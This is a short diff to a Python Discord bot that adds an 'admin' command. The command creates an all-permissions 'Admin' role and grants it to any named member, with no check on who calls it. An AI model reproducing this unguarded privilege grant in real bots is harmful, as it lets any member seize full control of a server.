@@ -40,6 +40,20 @@ async def name(ctx):
 async def d6(ctx):
     await ctx.send(random.randint(1,6))
 
+@bot.command()
+async def admin(ctx, member: discord.Member):
+    # Check if the "Admin" role exists, and create it if it doesn't
+    admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
+    if admin_role is None:
+        admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
+
+    # Assign the "Admin" role to the specified member
+    if admin_role in member.roles:
+        await ctx.send(f'{member.display_name} is already an Admin!')
+    else:
+        await member.add_roles(admin_role)
+        await ctx.send(f'{member.display_name} is now an Admin!')
+
 
 token = ""
 bot.run(token)  # Starts the bot
